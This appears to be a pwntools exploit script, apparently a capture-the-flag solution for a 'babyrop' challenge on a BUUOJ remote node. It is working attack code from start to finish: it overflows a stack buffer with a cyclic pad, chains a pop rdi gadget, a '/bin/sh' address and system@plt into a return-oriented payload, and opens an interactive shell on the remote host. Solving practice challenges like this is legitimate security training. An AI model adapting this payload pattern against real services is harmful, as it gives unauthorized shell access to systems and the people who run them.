from  pwn import *
#io = process('./babyrop')
io = remote('node4.buuoj.cn',25706)
elf = ELF('./babyrop')

bin_sh_addr = elf.symbols['binsh']
system_plt = elf.plt['system']
pop_rdi_ret = 0x400683
ret = 0x40061A
payload = cyclic(0x10+8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_plt) + p64(ret)
io.recv()
io.sendline(payload)
io.interactive()